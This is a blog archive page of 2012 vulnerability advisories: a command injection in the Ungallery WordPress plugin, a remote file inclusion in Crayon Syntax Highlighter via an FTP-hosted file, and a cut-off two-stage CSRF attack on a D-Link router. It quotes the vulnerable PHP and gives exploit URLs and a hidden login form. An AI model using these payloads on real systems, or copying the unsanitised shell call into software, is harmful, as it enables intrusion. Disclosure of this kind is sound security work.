		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/10/23/wordpress-ungallery-remote-command-injection-vulnerability/" title="Permalink to WordPress Ungallery remote command injection vulnerability" rel="bookmark">WordPress Ungallery remote command injection vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Analysis of vulnerability</strong></p>
<p>The Ungallery for WordPress offers functionality for searching for pictures in a gallery, which is implemented through the plain filesystem in <a href="http://plugins.svn.wordpress.org/ungallery/tags/2.1.4/search.php">search.php</a>.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa47cc881231046" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$gallerylink = ($_GET['gallerylink']) ;
$search = ($_GET['search']) ;
$dir = $pic_root . $gallerylink;

//	Find galleries
print "Searching in &lt;i&gt;$dir.&lt;/i&gt;
&lt;br /&gt;
&lt;br /&gt;";

print "These galleries matched &lt;i&gt;$search:&lt;/i&gt;&lt;br /&gt;";
$galleries = `find $dir -iname \*$search\* -type d`;

$galleries = explode("\n", $galleries);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa47cc881231046-18">18</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa47cc881231046-19">19</div><div class="crayon-num" data-line="crayon-53c98e7aa47cc881231046-20">20</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa47cc881231046-21">21</div><div class="crayon-num" data-line="crayon-53c98e7aa47cc881231046-22">22</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa47cc881231046-23">23</div><div class="crayon-num" data-line="crayon-53c98e7aa47cc881231046-24">24</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa47cc881231046-25">25</div><div class="crayon-num" data-line="crayon-53c98e7aa47cc881231046-26">26</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa47cc881231046-27">27</div><div class="crayon-num" data-line="crayon-53c98e7aa47cc881231046-28">28</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa47cc881231046-29">29</div><div class="crayon-num" data-line="crayon-53c98e7aa47cc881231046-30">30</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa47cc881231046-18"><span class="crayon-sy">$</span><span class="crayon-v">gallerylink</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'gallerylink'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa47cc881231046-19"><span class="crayon-sy">$</span><span class="crayon-v">search</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'search'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa47cc881231046-20"><span class="crayon-sy">$</span><span class="crayon-v">dir</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">pic_root</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">gallerylink</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa47cc881231046-21">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa47cc881231046-22"><span class="crayon-c">//&nbsp;&nbsp;&nbsp;&nbsp;Find galleries</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa47cc881231046-23"><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"Searching in &lt;i&gt;$dir.&lt;/i&gt;</span></div><div class="crayon-line" id="crayon-53c98e7aa47cc881231046-24"><span class="crayon-s">&lt;br /&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa47cc881231046-25"><span class="crayon-s">&lt;br /&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa47cc881231046-26">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa47cc881231046-27"><span class="crayon-i">print</span><span class="crayon-h"> </span><span class="crayon-s">"These galleries matched &lt;i&gt;$search:&lt;/i&gt;&lt;br /&gt;"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa47cc881231046-28"><span class="crayon-sy">$</span><span class="crayon-v">galleries</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">`</span><span class="crayon-i">find</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">dir</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">iname</span><span class="crayon-h"> </span><span class="crayon-sy">\</span><span class="crayon-o">*</span><span class="crayon-sy">$</span><span class="crayon-i">search</span><span class="crayon-sy">\</span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">type</span><span class="crayon-h"> </span><span class="crayon-i">d</span><span class="crayon-sy">`</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa47cc881231046-29">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa47cc881231046-30"><span class="crayon-sy">$</span><span class="crayon-v">galleries</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">explode</span><span class="crayon-sy">(</span><span class="crayon-s">"\n"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">galleries</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0037 seconds] -->
<p>Note that the <a href="http://php.net/manual/en/language.operators.execution.php">backtick character</a> in PHP has a special meaning, as opposed to the &#8221; and &#8216;. When you wrap something in 2 <a href="http://php.net/manual/en/language.operators.execution.php">backtick characters</a>, it will act as if the contents between them is passed to shell_exec. Note however that the $search variable, which is extracted from the search GET variable, is never sanitized before passed into the exec on line 28. This means that we can pull off a remote command injection with a simple request like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa47dc622860515" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/?x=x&amp;search=x | dir</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa47dc622860515-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa47dc622860515-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?x=x&amp;search=x | dir</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/command-injection/" rel="tag">Command Injection</a>, <a href="https://charlieeriksen.github.io/tag/ungallery/" rel="tag">Ungallery</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/10/23/wordpress-ungallery-remote-command-injection-vulnerability/#respond" title="Comment on WordPress Ungallery remote command injection vulnerability">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-176 -->

				
					
<article id="post-139" class="post-139 post type-post status-publish format-standard hentry category-advisories tag-crayon-syntax-highlighter tag-rfi tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/10/15/wordpress-crayon-syntax-highlighter-remote-file-inclusion-vulnerability/" title="1:14 pm" rel="bookmark" class="entry-date"><time datetime="2012-10-15T13:14:46+00:00" pubdate>October 15, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/10/15/wordpress-crayon-syntax-highlighter-remote-file-inclusion-vulnerability/" title="Permalink to WordPress Crayon Syntax Highlighter remote file inclusion vulnerability" rel="bookmark">WordPress Crayon Syntax Highlighter remote file inclusion vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href=" http://secunia.com/advisories/50804">Secunia advisory SA 50804</a></p>
<p><strong>Analysis of vulnerability</strong></p>
<p>The Crayon Syntax highlighter implements a vulnerable RPC-like system for AJAX in <a href="http://plugins.svn.wordpress.org/crayon-syntax-highlighter/trunk/util/ajax.php">/util/ajax.php</a> and <a href="http://plugins.svn.wordpress.org/crayon-syntax-highlighter/trunk/util/preview.php">/util/preview.php</a>. Both files share these 3 lines of code as being the first ones in both:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa4d29620664974" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require_once('../crayon_wp.class.php');
crayon_die_if_not_php($_GET['wp_load'], 'wp-load');
require_once($_GET['wp_load']);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa4d29620664974-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa4d29620664974-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa4d29620664974-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa4d29620664974-1"><span class="crayon-k ">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../crayon_wp.class.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa4d29620664974-2"><span class="crayon-e">crayon_die_if_not_php</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'wp_load'</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'wp-load'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa4d29620664974-3"><span class="crayon-k ">require_once</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'wp_load'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0015 seconds] -->
<p>So it apperas that at least it attempts to do some validation. Let us see how that is implemented in global.php(Included by crayon_wp.class.php):</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa4d37038360681" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Checks if the input is a valid PHP file and matches the $valid filename
function crayon_is_php_file($filepath, $valid) {
	$path_wp_load = pathinfo($filepath);
	return is_file($filepath) &amp;&amp; $path_wp_load['extension'] === 'php' &amp;&amp; $path_wp_load['filename'] === $valid;
}

// Stops the script if crayon_is_php_file() returns false
function crayon_die_if_not_php($filepath, $valid) {
	if (!crayon_is_php_file($filepath, $valid)) {
		die("Incorrect arguments for '$valid'");
	}
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa4d37038360681-187">187</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa4d37038360681-188">188</div><div class="crayon-num" data-line="crayon-53c98e7aa4d37038360681-189">189</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa4d37038360681-190">190</div><div class="crayon-num" data-line="crayon-53c98e7aa4d37038360681-191">191</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa4d37038360681-192">192</div><div class="crayon-num" data-line="crayon-53c98e7aa4d37038360681-193">193</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa4d37038360681-194">194</div><div class="crayon-num" data-line="crayon-53c98e7aa4d37038360681-195">195</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa4d37038360681-196">196</div><div class="crayon-num" data-line="crayon-53c98e7aa4d37038360681-197">197</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa4d37038360681-198">198</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa4d37038360681-187"><span class="crayon-c">// Checks if the input is a valid PHP file and matches the $valid filename</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa4d37038360681-188"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">crayon_is_php_file</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa4d37038360681-189"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$path_wp_load</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">pathinfo</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa4d37038360681-190"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">return</span><span class="crayon-h"> </span><span class="crayon-e">is_file</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">$path_wp_load</span><span class="crayon-sy">[</span><span class="crayon-s">'extension'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">===</span><span class="crayon-h"> </span><span class="crayon-s">'php'</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">$path_wp_load</span><span class="crayon-sy">[</span><span class="crayon-s">'filename'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">===</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa4d37038360681-191"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa4d37038360681-192">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa4d37038360681-193"><span class="crayon-c">// Stops the script if crayon_is_php_file() returns false</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa4d37038360681-194"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">crayon_die_if_not_php</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e7aa4d37038360681-195"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">crayon_is_php_file</span><span class="crayon-sy">(</span><span class="crayon-v">$filepath</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$valid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa4d37038360681-196"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">die</span><span class="crayon-sy">(</span><span class="crayon-s">"Incorrect arguments for '$valid'"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e7aa4d37038360681-197"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa4d37038360681-198"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0044 seconds] -->
<p>So it calls crayon_is_php_file which checks if the provided path is a file, the extension is &#8220;php&#8221; and the filename is what is expected, which in this case is wp-load.php. In theory, this should be safe if we assume that is_file only returns true for local file. However due to is_file also supporting FTP, we can get it to return true for a remote file on a FTP server! This means that if the server allows url includes, we can do a remote file include from a malicious FTP server hosting a wp-load.php file through an URL like this, either through ajax.php or preview.php:</p>
<p>http://192.168.80.130/wordpress/wp-content/plugins/crayon-syntax-highlighter/util/ajax.php?wp_load=ftp://192.168.80.201/wp-load.php</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/crayon-syntax-highlighter/" rel="tag">Crayon Syntax Highlighter</a>, <a href="https://charlieeriksen.github.io/tag/rfi/" rel="tag">RFI</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/10/15/wordpress-crayon-syntax-highlighter-remote-file-inclusion-vulnerability/#comments" title="Comment on WordPress Crayon Syntax Highlighter remote file inclusion vulnerability">1 Comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-139 -->

				
					
<article id="post-142" class="post-142 post type-post status-publish format-standard hentry category-security tag-csrf">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/" title="6:48 pm" rel="bookmark" class="entry-date"><time datetime="2012-09-29T18:48:38+00:00" pubdate>September 29, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/09/29/two-stage-csrf-attacks/" title="Permalink to Two-stage CSRF attacks" rel="bookmark">Two-stage CSRF attacks</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p>This week I ran into an interesting problem. I was doing some poking around with my DLink DIR-615(EU) router while working on some firmware reverse engineering. It occurred very quickly to me that the router had no protection against CSRF attacks. As with many other routers, the router also doesn&#8217;t enforce you to set a password for the Admin account, which simply sets it up for getting owned.</p>
<p>As it turns out, the vulnerability I found was already well-documented, but I saw no exploit which targeted both the CSRF attack and the default weak credentials in a single exploit. This would be needed for even a semi-reliable exploit to be delivered over the internet. I wondered why, and started investigating what would we required.</p>
<p><strong>The target</strong></p>
<p>The DLink DIR-615(EU) runs on a default IP(192.168.0.1) with default credentials being the Admin account with no password. The authentication system is kind of funky, in that on a successful authentication no cookie is set. Rather, it simply authenticates your local IP. I&#8217;ve not dug into this much further, but the short version of this story is that you either have to hope that the user has authenticated against the router somewhat recently, or you need to authenticate as a part of the attack.</p>
<p>The two requests we need to make to log in and do something to abuse this CSRF, such as change the admin password and enable remote management, are as following:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa5639325140098" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;form name="loginForm" method="POST" action="http://192.168.0.1/login.htm"&gt;
	&lt;input type="hidden" name="page" value="login" /&gt;
	&lt;input type="hidden" name="submitType" value="0" /&gt;
	&lt;input type="hidden" name="sel_userid" value="admin" /&gt;
	&lt;input type="hidden" name="userid" value="" /&gt;
	&lt;input type="hidden" name="passwd" value="" /&gt;
	&lt;input type="hidden" name="captchapwd" value="" /&gt;
&lt;/form&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa5639325140098-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5639325140098-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa5639325140098-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5639325140098-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa5639325140098-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5639325140098-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa5639325140098-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa5639325140098-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa5639325140098-1"><span class="crayon-o">&lt;</span><span class="crayon-e">form </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"loginForm"</span><span class="crayon-h"> </span><span class="crayon-v">method</span><span class="crayon-o">=</span><span class="crayon-s">"POST"</span><span class="crayon-h"> </span><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-s">"http://192.168.0.1/login.htm"</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa5639325140098-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-e">input </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-s">"hidden"</span><span class="crayon-h"> </span><span class="crayon-v">name</span><span class="crayon-o">=</span><span class="crayon-s">"page"</span><span class="crayon-h"> </span><span class="crayon-v">value</span><span class="crayon-o">=</span><span class="crayon-s">"login"</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span 